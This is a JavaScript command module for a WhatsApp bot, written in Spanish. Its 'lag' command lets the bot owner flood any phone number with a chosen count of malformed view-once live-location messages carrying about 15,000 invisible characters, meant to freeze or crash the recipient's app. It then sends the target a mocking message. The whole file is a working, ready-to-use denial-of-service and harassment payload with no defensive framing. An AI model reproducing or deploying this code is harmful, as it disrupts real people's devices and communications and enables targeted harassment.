// 💣 lag.js — Invocación de distorsión ritual
const { allOwners, botname } = require('../settings')

const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(15000) + '💥'.repeat(300),
        sequenceNumber: '999',
        jpegThumbnail: null,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag WhatsApp',
            body: 'Este mensaje es muy pesado',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

module.exports = {
  command: 'lag',
  handler: async (conn, { message, args, usedPrefix }) => {
    const from   = message.key.remoteJid
    const sender = message.key.participant || from

    // 🔥 DEBUG: invocación y owners
    console.log(`🔥 [DEBUG] Comando lag invocado por: ${sender}`)
    console.log('🔥 [DEBUG] allOwners:', allOwners)

    // 🔐 Validación de owner
    if (!allOwners.includes(sender)) {
      console.log(`🚫 [DEBUG] Usuario no autorizado: ${sender}`)
      return conn.sendMessage(from, {
        text: `*⛔ Acceso restringido*\n\n> Solo el gran asesor de ${botname} o los guardianes autorizados pueden liberar esta distorsión ritual...`
      }, { quoted: message })
    }

    // 🎯 Validación de formato
    if (!args[0] || !args[1]) {
      return conn.sendMessage(from, {
        text: `*📡 Uso:* ${usedPrefix}lag número | cantidad\n\n> Ejemplo: *${usedPrefix}lag 5219991234567 | 20*\n⚠️ Asegúrate de separar con el símbolo "|"`
      }, { quoted: message })
    }

    const [numeroRaw, cantidadRaw] = args.join(' ').split('|').map(v => v.trim())
    const numeroLimpio = numeroRaw.replace(/\D/g, '')
    const numero = numeroLimpio + '@s.whatsapp.net'
    const cantidad = parseInt(cantidadRaw)

    // 🧪 Validaciones suaves
    if (!numeroLimpio || numeroLimpio.length < 10) {
      return conn.sendMessage(from, {
        text: `*⚠️ Número inválido*\n\n> El número debe tener al menos 10 dígitos.\nEjemplo: *5219991234567*`
      }, { quoted: message })
    }

    if (isNaN(cantidad) || cantidad < 1) {
      return conn.sendMessage(from, {
        text: `*⚠️ Cantidad inválida*\n\n> La cantidad debe ser un número mayor a 0.\nEjemplo: *20*`
      }, { quoted: message })
    }

    // 🧠 Anuncio ceremonial
    await conn.sendMessage(from, {
      text: `*🧠 Sistema Zenitsu en línea...*\n🎯 Objetivo: *${numeroRaw}*\n💣 Intensidad: *${cantidad}*\n🔄 Preparando detonación ritual...`
    }, { quoted: message })

    // 🔁 Invocación múltiple
    for (let i = 0; i < cantidad; i++) {
      try {
        await conn.relayMessage(numero, buildLagMessage(), { messageId: conn.generateMessageTag() })
        await new Promise(resolve => setTimeout(resolve, 300))
      } catch (err) {
        console.error('💥 [DEBUG] Error al enviar lag:', err)
      }
    }

    // 💬 Burla final enviada al objetivo
    try {
      await conn.sendMessage(numero, {
        text: `💣 *BOOM.*\n\n😂 *Me río en tu cara mientras tu WhatsApp tiembla*\nEste ataque fue enviado por +53 5 3249242.`
      })
    } catch (err) {
      console.error('💥 [DEBUG] Error al enviar mensaje final:', err)
    }

    // ✅ Confirmación al invocador
    return conn.sendMessage(from, {
      text: `*✅ Ritual completado.*\n\n💥 Se enviaron *${cantidad}* paquetes de distorsión visual a *${numeroRaw}*\n🎭 Mensaje final enviado: *Me río en tu cara mientras tu WhatsApp tiembla.*\n🗂️ Registro actualizado en el centro de datos de Shizuka.`
    }, { quoted: message })
  }
}